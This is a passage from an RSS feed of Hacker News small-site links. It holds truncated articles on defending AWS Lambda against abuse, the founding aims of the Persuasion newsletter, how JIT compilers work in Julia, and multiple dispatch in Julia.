<p>Let's start with the dumbest and traditionally most effective method. Make sure your code does not "hang" on unexpected input. You should carefully check all edge cases and think about possible inputs that may cause function timeouts, <a href="https://en.wikipedia.org/wiki/ReDoS">ReDoS attacks</a>, or long payloads. An attacker may take advantage of this weakness.</p>
<h3>Configure alerts</h3>
<p>Another incredibly brilliant idea if you don't want to get a huge bill at some point — set up the billing alerts. It's very easy and fast to set up (it's better to do it through AWS Budgets than through AWS SNS and AWS Cloudwatch), but it's very useful — you will be informed in case of a problem.</p>
<p>Also, I would advise making limits on billing. Of course, everything depends on the specific business task of the service and maybe it's better to overpay, but have a working endpoint.</p>
<h3>Use throttling(reserved concurrency)</h3>
<p>We have already found out that the AWS Lambda provides multiple instances running concurrently to scale functions, but if you have several Lambda functions running at the same time and one of them is under abuse, the resources of other functions may be exhausted because of it. The AWS Lambda has a default limit on the number of concurrent executions per account per region. And if your functions exceed this limit, additional user requests will be throttled by AWS with 429 status as it was described earlier.</p>
<p>But the concurrency level can be set on per-function bases. Besides AWS Lambda, the API Gateway supports throttling as well. The defaults are reasonable, but you can alter them however you like. For example, you can allow 5 calls per second if it makes sense for your application, after which the API Gateway will block additional …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://luminousmen.com/post/aws-lambda-abuse">https://luminousmen.com/post/aws-lambda-abuse</a></em></p>]]>
            </description>
            <link>https://luminousmen.com/post/aws-lambda-abuse</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740734</guid>
            <pubDate>Sun, 05 Jul 2020 18:23:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Purpose of Persuasion]]>
            </title>
            <description>
<![CDATA[
Score 78 | Comments 40 (<a href="https://news.ycombinator.com/item?id=23740669">thread link</a>) | @apsec112
<br/>
July 5, 2020 | https://www.persuasion.community/p/the-purpose-of-persuasion | <a href="https://web.archive.org/web/*/https://www.persuasion.community/p/the-purpose-of-persuasion">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a target="_blank" href="https://cdn.substack.com/image/fetch/c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F76311586-b35a-4d2b-82b1-d8a8b6ca9b18_4522x3019.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F76311586-b35a-4d2b-82b1-d8a8b6ca9b18_4522x3019.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/76311586-b35a-4d2b-82b1-d8a8b6ca9b18_4522x3019.jpeg&quot;,&quot;height&quot;:972,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:6649732,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></p><p>Friends,</p><p>I'm floored by the response of the past three days.</p><p>Once I hit <em>send</em>, this article will land in the inboxes of over 15,000 people. When we launched, my main fear was that the world would not be interested in a community that pledges to defend the values of a free society; now, my main fear is that we won't be able to live up to the hype.</p><p>So, here's my promise: We will do our very best to earn your trust. Some great articles will be coming your way soon. We are getting ready to announce more events and high-level members of the community. I hope you will join us for our inaugural townhall, which will take place next Sunday, July 12th, at 4pm EST. (Watch this space for the invite.) I'm very, very excited about what lies ahead. But I also know that it is hard to build this kind of community from the ground up, and that we will undoubtedly make mistakes along the way. Please bear with us when we do.</p><p>In the meanwhile, I want to take you a little deeper into the thinking that went into creating <em>Persuasion</em>. Why this project? Why now? And how can just a bunch of us—even if we are a much larger bunch than I could possibly have dreamed a few days ago—really make a difference to the future of free societies in the United States and around the world? The key to an answer lies in a short (and necessarily schematic) history of American intellectual life over the past half century. </p><p>Fifty years ago, the most important American institutions enjoyed a degree of legitimacy that is now hard to fathom. Nearly every American watched the news on one of the three network television stations. Nearly every American had a positive opinion of Princeton and Stanford. Nearly every Member of Congress believed that the advice of the Brookings Institution or the Council on Foreign Relations was to be taken seriously.&nbsp;</p><p>These institutions had much to recommend them: They gave the public a shared set of facts and assumptions, which could form the basis of political debate. And, though they never thought of their primary goal as fighting for the ideals of a free society, their operating system was philosophically liberal: From CBS to Harvard to Brookings, senior decision makers instinctively believed in values like free speech and due process.</p><p>However, these institutions also suffered from two important shortcomings. First, the people they admitted into their gilded halls only represented a small slice of America's population: sexism, racism and homophobia were <em>far</em> more prevalent in these institutions than they are today. The views they considered serious sometimes included the morally abhorrent.&nbsp;</p><p>Second, the realm of the “reasonable" was rather narrow. And, though this narrowness of debate constituted the lesser injustice, it was—at least in the short term—the cause of greater instability: Having come to believe that they could never quite speak in their own voices in the halls of the Brookings Institution or the column inches of the <em>New York Times</em>, a few assorted bands of malcontents started to cast around for an alternative. </p><p>Of these, the group that had the biggest impact on public life in America was a band of devoted conservatives, determined to create an ideological counter-establishment that could rival the mainstream.&nbsp;What started with <em>National Review</em>, an ideological fighting magazine, quickly grew into a sprawling and immensely powerful network of conservative institutions. The Heritage Foundation was set up to rival the influence of Brookings. The Federalist Society sought to change the ideological composition of America's judiciary. Fox News did its dismal best to spread the ideas of the conservative movement beyond the Beltway. A whole network of activist groups provided conservatives with an ideological foundation, a group of friends, and a professional home. Measured by its own ambitions,&nbsp;the movement was a staggering success.</p><p>Other minoritarian ideological movements took a page out of the same playbook. In 1960, a libertarian was a person with idiosyncratic views and no obvious political home. Then, the Institute for Humane Studies started to advocate libertarian ideas on college campuses, <em>Reason </em>took up their public defense, and a reinvigorated American Enterprise Institute set out to influence legislators on Capitol Hill. By 1980, the influence and intellectual self-confidence of libertarians had increased enormously.</p><p>The further left has always had its share of counter-establishment institutions. <em>The Nation</em>, after all, is one of the oldest magazines in the country, and some academic disciplines have long been at the forefront of leftist thought. But the left, too, has of late succeeded in building a more cohesive network of fighting institutions, as universities have become much more progressive, movements like the Democratic Socialists of America have awakened from decades of peaceful slumber, and publications like <em>Jacobin </em>have infused the movement with fresh intellectual energy.</p><p>Five or ten years ago, our potted history might have concluded here. Ideological movements from conservative to libertarian to leftist had fighting institutions of their own. Though philosophical liberals did not have a comparable home, they could confidently express their views within mainstream institutions.&nbsp;</p><p>But then those institutions started to change.</p><p>The story of that change has attracted an immense amount of attention over the past months. I won't bore you with a detailed recap of its most worrying manifestations, from the firing of James Bennet to the uncritical celebration of Robin DiAngelo. Nor do I want to suggest that these changes have completely delegitimized the mainstream: These institutions have not yet become wholly illiberal, and the advocates of a free society would be foolish to stop fighting for them.</p><p>But the erosion of values like free speech and due process within mainstream institutions does put philosophical liberals at a unique disadvantage. It is difficult to convey just how many amazing writers, journalists, and think-tankers—some young and some old, some relatively obscure and others very famous—have privately told me that they can no longer write in their own voices; that they are counting the days until they get fired; and that they don't know where to turn if they do. (Astonishingly, a number of them are far enough to the left to have supported Bernie Sanders in the primaries.)</p><p>This, to me, is a huge part of the reason why the defenders of the free society have seemed to lack conviction in recent months and years. Feeling, at best, begrudgingly tolerated by the institutions that employ them, they are always on the back foot: writing and speaking with one eye on Twitter, one eye on a hostile editor, and one eye on the attacks being shared on their own company’s Slack channel. (As you may have noticed, that requires too many eyes.)</p><p>But, if this situation helps to explain the collective lack of confidence among the advocates of a free society, it also points the way to an obvious solution. <strong>Instead of lamenting our loss of control over the establishment, we should follow the lead of other movements that have successfully built their own counter-establishment institutions.</strong><em>&nbsp;</em></p><p><em>That </em>is the goal I had in mind in starting <em>Persuasion</em>.</p><p>One core element of this project is a publishing platform explicitly devoted to debating, articulating, and defending the values of a free society. Emulating what <em>Reason</em>, <em>Jacobin,</em> and the <em>National Review</em> have accomplished within their own ideological traditions, I hope to create a space in which philosophical liberals can ask hard questions and come up with compelling answers. This requires both a commitment to a set of shared aspirations and enough diversity of opinion to force us to think very hard about how we can make the world a better place. This is a space for people who are open to changing their minds, but not their fundamental values.</p><p>But creating a modern reinvention of a fighting magazine, devoted to defending the ideals of a free society, is not my only ambition. If places like the <em>National Review</em> had a tremendous influence on our society, it is also because they became the nucleus of a cohesive community, which seeded a much wider archipelago of allied institutions. This is why I take the community element of <em>Persuasion</em>—all the live events, book clubs and social gatherings we'll experiment with over the coming months—so seriously. And it is also why I hope that this particular venture will spawn many formally independent organizations that share our founding values.</p><p>Before I close, let me say two quick words about some of the establishment institutions whose recent fate I have been lamenting. The first is that we must do what we can to preserve those universities, publications, and think tanks that still operate with fundamentally (small l) liberal assumptions. For example, I deeply love <em>The Atlantic</em>, and will continue to write for it. A small fighting institution that primarily addresses a devoted crowd of philosophical liberals neither is nor should be in competition with a large general interest magazine whose readership will always span a much broader ideological range. Part of the reason why we should articulate these values as clearly, forcefully, and persuasively as possible within these pages is to maximize the likelihood that they will continue to form the implicit operating system of vitally important publications like <em>The Atlantic</em>.&nbsp;</p><p>The second thing is that our ambition needs to extend beyond nostalgia. There is much to lament about the changes that have taken place in some of the country's most important institutions over the past years. But there is also much to criticize in what these institutions looked like at their supposed best. Our goal is not to return to a golden age that has, sadly, never existed; it is to build societies that live up to the noble and ambitious values of freedom and justice better than any society of the past.</p><p>The examples I have used here&nbsp;are very …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.persuasion.community/p/the-purpose-of-persuasion">https://www.persuasion.community/p/the-purpose-of-persuasion</a></em></p>]]>
            </description>
            <link>https://www.persuasion.community/p/the-purpose-of-persuasion</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740669</guid>
            <pubDate>Sun, 05 Jul 2020 18:16:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Deep Introduction to JIT Compilers: JITs are not very Just-in-time]]>
            </title>
            <description>
<![CDATA[
Score 278 | Comments 89 (<a href="https://news.ycombinator.com/item?id=23740655">thread link</a>) | @chrisseaton
<br/>
July 5, 2020 | https://carolchen.me/blog/jits-intro/ | <a href="https://web.archive.org/web/*/https://carolchen.me/blog/jits-intro/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  <header>
    
    
  </header>

  <main id="main">
    
<article>
  <header>
    
    
  </header>
  <section id="js-article">
    
<p><em>If you are familiar with how JITs generally work (if you get what the title is referring to), I recommend skimming this or going straight to reading <a href="https://carolchen.me/blog/jits-impls">How JIT Compilers are Implemented and Fast: Julia, Pypy, LuaJIT, Graal and More</a></em> </p>
<p>My mentor, <a href="https://chrisseaton.com/">Chris</a>, who took me from “what is a JIT” to where I am now once told me that compilers were just bytes in bytes out and not at all low-level and scary. This is actually fairly true, and it's fun to learn about compiler internals and often useful for programmers everywhere!</p>
<p>This blog post gives background on how programming languages are implemented and how JITs work. It'll introduce the implementation details of the Julia language, though it won't talk about specific implementation details or optimizations made by more traditional JITs. Check out <a href="https://carolchen.me/blog/jits-impls">How JIT Compilers are Implemented and Fast: Julia, Pypy, LuaJIT, Graal and More</a> to read about how meta-tracing is implemented, how Graal supports C extensions, the relationship of JITs with LLVM and more!</p>
<h2 id="how-programming-languages-are-implemented">How Programming Languages are Implemented<a href="#how-programming-languages-are-implemented" aria-label="Anchor link for: how-programming-languages-are-implemented"> <i></i></a>
</h2>
<p>When we run a program, it’s either interpreted or compiled in some way. The compiler/interpreter is sometimes referred to as the "implementation" of a language, and one language can have many implementations. You may have heard things like "Python is interpreted", but that really means the reference(standard/default) implementation of Python is an interpreter. Python is a language specification and <em>CPython</em> is the interpreter and implementation of Python. </p>
<p>An interpreter is a program that directly executes your code. Well-known interpreters are usually written in C. Ruby, Python and PHP are written in C. Below is a function that loosely models how an interpreter might work:</p>
<pre><code><span>func </span><span>interpret</span><span>(</span><span>code </span><span>string</span><span>) {
  </span><span>if </span><span>code </span><span>== </span><span>"print('Hello, World!')" </span><span>{
    </span><span>print</span><span>(</span><span>"Hello, World"</span><span>);
  } </span><span>else if </span><span>code </span><span>==</span><span> “</span><span>x </span><span>= </span><span>0</span><span>; </span><span>x </span><span>+= </span><span>4</span><span>; </span><span>print</span><span>(</span><span>x</span><span>)” {
    variable_x </span><span>:= </span><span>0 
    </span><span>variable_x </span><span>+= </span><span>4
    </span><span>print</span><span>(</span><span>x</span><span>)
  }
}
</span></code></pre>
<p>A compiler is a program that translates code from some language to another language, though it usually refers to a destination language that is a machine code. Examples of compiled languages are C, Go and Rust.</p>
<pre><code><span>func </span><span>compile</span><span>(</span><span>code </span><span>string</span><span>) {
  []</span><span>byte </span><span>compiled_code </span><span>= </span><span>get_machine_code</span><span>(</span><span>code</span><span>);
  </span><span>write_to_executable</span><span>(</span><span>compiled_code</span><span>);
}
</span></code></pre>
<p>The difference between a compiled and interpreted language is actually much more nuanced. C, Go and Rust are clearly compiled, as they output a machine code file - which can be understood natively by the computer. The compile and run steps are fully distinct.</p>
<p>However, compilers can translate to any target language (this is sometimes called transpiling). Java for example, has a two-step implementation. The first is compiling Java source to bytecode, which is an Intermediate Representation (IR). The bytecode is then JIT compiled - which involves interpretation.</p>
<p>Python and Ruby also execute in two steps. Despite being known as interpreted languages, their reference implementations actually compile the source down to a bytecode. You may have seen .pyc files (not anymore in Python3) which contain Python bytecode! The bytecode is then interpreted by a virtual machine. These interpreters use bytecode because programmers tend to care less about compile time, and creating a bytecode language allows the engineers to specify a bytecode that is as efficient to interpret as possible. </p>
<p>Having bytecode is how languages check syntax before execution (though they could technically just do a pass before starting the interpreter). An example below shows why you would want to check syntax before runtime.</p>
<pre><code><span>sleep</span><span>(</span><span>1000</span><span>)
bad syntax beep boop beep boop
</span></code></pre>
<p>Another important note is that interpreted languages are typically slower for various reasons, the most obvious being that they're executed in a higher level language that has overhead execution time. The main reason is that the dynamic-ness of the languages they tend to implement means that they need many extra instructions to decide what to do next and how to route data. People still choose to build interpreters over compilers because they're easier to build and are more suited to handle things like dynamic typing, scopes etc (though you could build a compiler that has the same features). </p>
<h3 id="so-what-is-a-jit">So What is a JIT?<a href="#so-what-is-a-jit" aria-label="Anchor link for: so-what-is-a-jit"> <i></i></a>
</h3>
<p>A JIT compiler doesn't compile code Ahead-Of-Time (AOT), but still compiles source code to machine code and therefore is not an interpreter. JITs compile code at runtime, while your program is executing. This gives the JITs flexibility for dynamic language features, while maintaining speed from optimized machine code output. JIT-compiling C would make it slower as we'd just be adding the compilation time to the execution time. JIT-compiling Python would be fast, as compilation + executing machine code can often be faster than interpreting, especially since the JIT has no need to write to a file (disk writing is expensive, memory/RAM/register writing is fast). JITs also improve in speed by being able to optimize on information that is only available at runtime.</p>
<h3 id="julia-a-jit-compiler-that-s-just-in-time">Julia: a JIT Compiler that's Just-in-time<a href="#julia-a-jit-compiler-that-s-just-in-time" aria-label="Anchor link for: julia-a-jit-compiler-that-s-just-in-time"> <i></i></a>
</h3>
<p>A common theme between compiled languages is that they're statically typed. That means when the programmer creates or uses a value, they’re telling the computer what type it is and that information is guaranteed at compile time.</p>
<p>Julia is dynamically typed, but internally Julia is much closer to being statically typed.</p>
<pre><code><span>function </span><span>multiply</span><span>(x, y)
  x </span><span>*</span><span> y
</span><span>end
</span></code></pre>
<p>Here is an example of a Julia function, which could be used to multiply integers, floats, vectors, strings etc (Julia allows operator overloading). Compiling out the machine code for <em>all</em> these cases is not very productive for a variety of reasons, which is what we'd have to do if we wanted Julia to be a compiled language. Idiomatic programming means that the function will probably only be used by a few combinations of types and we don't want to compile something that we don't use yet since that's not very jitty (this is not a real term).</p>
<p>If I were to code <code>multiply(1, 2)</code>, then Julia will compile a function that multiplies integers. If I then wrote <code>multiply(2, 3)</code>, then the already-compiled code will be used. If I then added <code>multiply(1.4, 4)</code>, another version of the function will be compiled. We can observe what the compilation does with <code>@code_llvm multiply(1, 1)</code>, which generates LLVM Bitcode (not quite machine code, but a lower-level Intermediate Representation).</p>
<pre><code><span>define i64 @julia_multiply_17232(i64, i64) {
top</span><span>:</span><span>
; ┌ @ int</span><span>.</span><span>jl</span><span>:</span><span>54</span><span> within `*'
   </span><span>%</span><span>2 </span><span>=</span><span> mul i64 </span><span>%</span><span>1</span><span>, </span><span>%</span><span>0</span><span>
; └
  ret i64 </span><span>%</span><span>2</span><span>
}
</span></code></pre>
<p>And with <code>multiply(1.4, 4)</code>, you can see how complicated it can get to compile even one more function. In AOT compiled Julia, all (some optimizations can be made to reduce) of these combinations would have to live in the compiled code even if only one was used, along with the control flow to delegate. </p>
<pre><code><span>define double @julia_multiply_17042(double, i64) {
top</span><span>:</span><span>
; ┌ @ promotion</span><span>.</span><span>jl</span><span>:</span><span>312</span><span> within `*'
; │┌ @ promotion</span><span>.</span><span>jl</span><span>:</span><span>282</span><span> within `promote'
; ││┌ @ promotion</span><span>.</span><span>jl</span><span>:</span><span>259</span><span> within `_promote'
; │││┌ @ number</span><span>.</span><span>jl</span><span>:</span><span>7</span><span> within `convert'
; ││││┌ @ float</span><span>.</span><span>jl</span><span>:</span><span>60</span><span> within `</span><span>Float64</span><span>'
       </span><span>%</span><span>2 </span><span>=</span><span> sitofp i64 </span><span>%</span><span>1</span><span> to double
; │└└└└
; │ @ promotion</span><span>.</span><span>jl</span><span>:</span><span>312</span><span> within `*' @ float</span><span>.</span><span>jl</span><span>:</span><span>405
   </span><span>%</span><span>3 </span><span>=</span><span> fmul double </span><span>%</span><span>2</span><span>, </span><span>%</span><span>0</span><span>
; └
  ret double </span><span>%</span><span>3</span><span>
}
</span></code></pre>
<p>The general strategy of “assume a type and compile/behave based on that” is called type inferencing, which Julia mildly uses in the examples above. There are a lot of other compiler optimizations that are made, though none of them are very specific to JITs as Julia may be better described as a lazy AOT compiler.</p>
<p>The simplicity of this kind of jitting makes it easy for Julia to also supply AOT compilation. It also helps Julia to benchmark very well, definitely a tier above languages like Python and comparable to C (I'd cite numbers, but those are always nuanced and I don't want to get into that).</p>
<h3 id="so-what-is-a-jit-take-two">So What is a JIT? Take Two.<a href="#so-what-is-a-jit-take-two" aria-label="Anchor link for: so-what-is-a-jit-take-two"> <i></i></a>
</h3>
<p>Julia is actually the jittiest JIT I'll discuss, but not the most interesting as a "JIT". It actually compiles code right before the code needs to be used -- just in time. Most JITs however (Pypy, Java, JS Engines), are not actually about compiling code just-in-time, but compiling <em>optimal code</em> at an optimal time. In some cases that time is actually never. In other cases, compilation occurs more than once. In a vast majority of the cases compilation doesn't occur until after the source code has been executed numerous times, and the JIT will stay in an interpreter as the overhead to compilation is too high to be valuable.</p>
<p><img src="https://carolchen.me/blog/img/jits/jitbrr.jpg" alt=""></p>
<p>The other aspect at play is generating <em>optimal code</em>. Assembly instructions are not created equal, and compilers will put a lot of effort into generating well-optimized machine code. Usually, it is possible for a human to write better assembly than a compiler (though it would take a fairly smart and knowledgeable human), because the compiler cannot dynamically analyze your code. By that, I mean things like knowing the possible range of your integers or what keys are in your map, as these are things that a computer could only know after (partially) executing your program. A JIT compiler can actually do those things because it interprets your code first and gathers data from the execution. Thus, JITs are expensive in that they interpret, and add compilation time to execution time, but they make it up in highly optimised compiled code. With that, the timing of compilation is also dependent on whether the JIT has gathered enough valuable information.</p>
<p>The cool part about JITs is that I was sort of lying when I said a JIT implementation of C could not be faster than existing compiled implementations. It would not be feasible to try, but jit-compiling C in the way I just described is not a strict superset of compiling a language and thus it is not logically impossible to compile code fast enough to make up for the compile+profile+interpreting time. If I "JIT compiled" C similarly to how Julia does it (statically compile each function as it's called), it would be impossible to …</p></section></article></main></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://carolchen.me/blog/jits-intro/">https://carolchen.me/blog/jits-intro/</a></em></p>]]>
            </description>
            <link>https://carolchen.me/blog/jits-intro/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740655</guid>
            <pubDate>Sun, 05 Jul 2020 18:14:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Multiple Dispatch in Julia]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 8 (<a href="https://news.ycombinator.com/item?id=23740622">thread link</a>) | @wikunia
<br/>
July 5, 2020 | https://opensourc.es/blog/basics-multiple-dispatch/ | <a href="https://web.archive.org/web/*/https://opensourc.es/blog/basics-multiple-dispatch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>From time to time I hear that my posts are a little bit too deep and complicated for beginners. I totally agree: especially in my newest series on <a href="https://opensourc.es/blog/constraint-solver-1">"How to build a constraint solver from scratch?"</a> which is probably a never ending series. I do like to blog about it and will continue but this series is different.</p>
<p>Julia is a relatively young language and not too many people are using it. It thrives in scientific computing but I believe that it can be used for general computing (probably where start up time is not that relevant) i.e. I do use it for creating this blog with <a href="https://franklinjl.org/">Franklin</a> which I blogged a bit about as well <a href="https://opensourc.es/blog/Franklin.jl">here</a>.</p>
<p>This series tries to explain some of the core concepts of Julia and maybe some packages to beginners. I, the explainer of this stuff here, am by no means an expert in any of these. If you know this blog then you might know that I'm trying to explain stuff directly after I've learned them to hopefully be able to communicate better than some people who do this their entire life and are experts in it. Blogs from experts are sometimes hard to follow for me, so maybe also for you. I'll let them proof read my blog post just to be sure that there is nothing wrong with what I explain ;)</p>
<p>Posts in this series can be reached over the side bar. </p>
<p>Post 2: <a href="https://opensourc.es/blog/basics-repl-revise">REPL &amp; Revise</a></p>
<p>Okay everyone ready?</p>

<h2 id="what_is_dispatch"><a href="#what_is_dispatch">What is dispatch?</a></h2>
<p>In every programming language there are <code>functions</code> which have the purpose of providing structure and reusability of code. The functions have a <code>name</code> and some <code>arguments</code>.  They are defined like</p>
<pre><code>def add(x, y):
    return x + y</code></pre>
<p>In Python this can be called with <code>add(2,3)</code> which gives the expected <code>5</code> but also <code>add("2","3")</code> gives <code>'23'</code> which might make sense or not depending on who you ask :D</p>
<p>Now how about <code>add("2", 3)</code> ?</p>
<p>This results in an error <code>TypeError: can only concatenate str (not "int") to str</code> which again can make sense. Well I would say it does but Javascript does something different:</p>
<pre><code>function add(x,y) {
    return x+y
}</code></pre>
<p>will produce <code>"23"</code> for that.</p>
<p>Then there are of course languages like <code>C++</code> where this all is not that simple because we need to introduce types:</p>
<pre><code>int add(int x, int y) {
  return x+y;
}</code></pre>
<p>There it is clear for everyone that it takes two <code>int</code> and returns one <code>int</code>. Because it is a compiled language we would get an error directly when trying to call it with <code>add("2", 3)</code>.</p>
<p>Now what is the point? We can see different concepts here with having static types as in C++ and dynamic typing in JS and Python. They both have pros and cons which is probably obvious.  The one is easier to reason about and the others are maybe easier to hack around with.</p>
<p>Let's go into dispatching on those three languages:</p>
<p>In Python it is: Ah okay the user wants to call <code>add</code>:</p>
<ul>
<li><p>We have the <code>add</code> function</p>
</li>
<li><p>Lets call it with the arguments.</p>
</li>
<li><p>Good that works as it expects two arguments and we have two.</p>
</li>
</ul>
<p>Then we might get to the point where the function doesn't work like for <code>add("2", 3)</code> and throw an error or it works out and the answer is returned. </p>
<p>It is basically the same in JS. There are possibility some "extensions" like Typescript where things might happen differently. I haven't programmed with any of those languages lately so keep that in mind.</p>
<p>In <code>C++</code> more things are going on as each variable has a static type and one can check directly whether this fits or not. This means as we can later see that there can be more functions with the same name. I'll explain the difference between function overloading and multiple dispatch in that part ;)</p>
<p>In all of these languages we can have classes such that we might have a class <code>Manufacturer</code> and we can define <code>add(self, thing)</code> or something like that and can call the function with  <code>manufacturer.add(thing)</code>. This can be kind of seen as single dispatch. Dispatch is basically the process of deciding which function to call. Here it depends on the type of <code>manufacturer</code>. Is it a <code>Manufacturer</code> or a <code>Box</code>? For a <code>Box</code> we might have defined a class <code>Box</code> and <code>add(self, box)</code> inside of it.</p>
<div><p>⚠ Note</p> <p>These examples are more from the Python world but hopefully convey the point.</p></div>
<p>For people coding in Julia for longer this might sound like a weird concept. Actually writing about it, I am thinking: How would I do some things, where I use multiple dispatch all the time (like in the ConstraintSolver) in one of those languages?</p>
<p>Before I explain multiple dispatch I want to note:</p>
<p>Yes there are ways in Python for single dispatching like <a href="https://www.blog.pythonlibrary.org/2016/02/23/python-3-function-overloading-with-singledispatch/">@singledispatch</a> but given that the main posts I found when searching are 3-4 years old I doubt that a lot are using it :D</p>
<p>And it is still single dispatch.</p>
<h2 id="how_does_dispatch_work_in_julia"><a href="#how_does_dispatch_work_in_julia">How does dispatch work in Julia?</a></h2>
<p>Now that there is that out of our way let us have a look at one example in Julia:</p>
<pre><code>add(x, y) = x+y</code></pre>
<p>just to show a neat little way of defining one-line functions... (or as they are called in Julia: Methods)</p>
<p>The interesting things is when you type this in the Julia REPL (Read-eval-print loop) you get:</p>
<pre><code>julia&gt; add(x, y) = x+y
add (generic function with 1 method)</code></pre>
<p>calling that function works basically like in Python (from the user perspective for now). It doesn't work for strings though.</p>
<div><p>⚠ Note</p> <p>Julia and <code>+</code> for strings: Julia is a mathematical language and <code>+</code> is commutative whereas concatenating strings is not. So <code>"2"+"3"</code> is not <code>"3"+"2"</code>. Therefore Julia decided to use <code>*</code> instead. Which is commutative for numbers but not matrices for example.</p></div>
<p>Okay where did I interrupt myself? ... Ah yeah so we have an <code>add</code> function with one method now in the REPL. That looks like we might be able to add a new one, right?</p>
<div><p>⚠ Note</p> <p>As correctly pointed out on <a href="https://www.reddit.com/r/Julia/comments/hfk3u3/basics_multiple_dispatch_start_of_a_new_series/fvykyl3?utm_source=share&amp;utm_medium=web2x">Reddit</a>: I use mostly the word function. In Julia there is actually a difference between functions and methods. There is one <code>+</code> function with a lot of different implementations: called methods.</p></div>
<pre><code>julia&gt; add(x,y) = 2x+y
add (generic function with 1 method)</code></pre>
<p>okay that did not work because it still allows all types of inputs (and throws an error later when it doesn't work) because the compiler had no way to decide which <strike> function</strike>method to call. </p>
<p>Should it guess? It just overwrites the old method.</p>
<p>A small side step again: Let's check what happens when we call <code>add("2", "3")</code>
</p><pre><code>julia&gt; add("a", "b")
ERROR: MethodError: no method matching *(::Int64, ::String)
Closest candidates are:
  *(::Any, ::Any, ::Any, ::Any...) at operators.jl:529
  *(::Missing, ::AbstractString) at missing.jl:174
  *(::T, ::T) where T&lt;:Union{Int128, Int16, Int32, Int64, Int8, UInt128, UInt16, UInt32, UInt64, UInt8} at int.jl:54
  ...
Stacktrace:
 [1] add(::String, ::String) at ./REPL[3]:1
 [2] top-level scope at REPL[4]:1</code></pre>
<p>That error occurs when calling <code>2x</code> where it figured that <code>2</code> is an integer and <code>x = "2"</code> is a string. It gives us information of what kind of types it can multiply.</p>
<p>Let's pick one: </p><pre><code>*(::T, ::T) where T&lt;:Union{Int128, Int16, Int32, Int64, Int8, UInt128, UInt16, UInt32, UInt64, UInt8} at int.jl:54</code></pre>
<p>This tells us that we can multiply two numbers of those types when they are the same. So <code>UInt8</code> with <code>UInt8</code> but I come to that syntax later.</p>
<p>You might wonder how many of those <code>*</code> <strike> functions</strike>methods there are: <code>357</code> is the answer which you get when typing</p>
<pre><code>julia&gt; methods(*)
...</code></pre>
<p>which gives you a long list with all kind of weird types where it sometimes spreads over several lines. I mean what is this? :D</p>
<pre><code>[345] *(A::LinearAlgebra.LQ{TA,S} where S&lt;:AbstractArray{TA,2}, B::Union{DenseArray{TB,1}, DenseArray{TB,2}, Base.ReinterpretArray{TB,1,S,A} where S where A&lt;:Union{SubArray{T,N,A,I,true} where I&lt;:Union{Tuple{Vararg{Real,N} where N}, Tuple{AbstractUnitRange,Vararg{Any,N} where N}} where A&lt;:DenseArray where N where T, DenseArray}, Base.ReinterpretArray{TB,2,S,A} where S where A&lt;:Union{SubArray{T,N,A,I,true} where I&lt;:Union{Tuple{Vararg{Real,N} where N}, Tuple{AbstractUnitRange,Vararg{Any,N} where N}} where A&lt;:DenseArray where N where T, DenseArray}, Base.ReshapedArray{TB,1,A,MI} where MI&lt;:Tuple{Vararg{Base.MultiplicativeInverses.SignedMultiplicativeInverse{Int64},N} where N} where A&lt;:Union{Base.ReinterpretArray{T,N,S,A} where S where A&lt;:Union{SubArray{T,N,A,I,true} where I&lt;:Union{Tuple{Vararg{Real,N} where N}, Tuple{AbstractUnitRange,Vararg{Any,N} where N}} where A&lt;:DenseArray where N where T, DenseArray} where N where T, SubArray{T,N,A,I,true} where I&lt;:Union{Tuple{Vararg{Real,N} where N}, Tuple{AbstractUnitRange,Vararg{Any,N} where N}} where A&lt;:DenseArray where N where T, DenseArray}, Base.ReshapedArray{TB,2,A,MI} where MI&lt;:Tuple{Vararg{Base.MultiplicativeInverses.SignedMultiplicativeInverse{Int64},N} where N} where A&lt;:Union{Base.ReinterpretArray{T,N,S,A} where S where A&lt;:Union{SubArray{T,N,A,I,true} where I&lt;:Union{Tuple{Vararg{Real,N} where N}, Tuple{AbstractUnitRange,Vararg{Any,N} where N}} where A&lt;:DenseArray where N where T, DenseArray} where N where T, SubArray{T,N,A,I,true} where I&lt;:Union{Tuple{Vararg{Real,N} where N}, Tuple{AbstractUnitRange,Vararg{Any,N} where N}} where A&lt;:DenseArray where N where T, DenseArray}, SubArray{TB,1,A,I,L} where L where I&lt;:Tuple{Vararg{Union{Int64, AbstractRange{Int64}, Base.AbstractCartesianIndex},N} where N} where A&lt;:Union{Base.ReinterpretArray{T,N,S,A} where S where A&lt;:Union{SubArray{T,N,A,I,true} where I&lt;:Union{Tuple{Vararg{Real,N} where N}, Tuple{AbstractUnitRange,Vararg{Any,N} where N}} where A&lt;:DenseArray where N where T, DenseArray} where N where T, Base.ReshapedArray{T,N,A,MI} where MI&lt;:Tuple{Vararg{Base.MultiplicativeInverses.SignedMultiplicativeInverse{Int64},N} where N} where A&lt;:Union{Base.ReinterpretArray{T,N,S,A} where S where A&lt;:Union{SubArray{T,N,A,I,true} where I&lt;:Union{Tuple{Vararg{Real,N} where 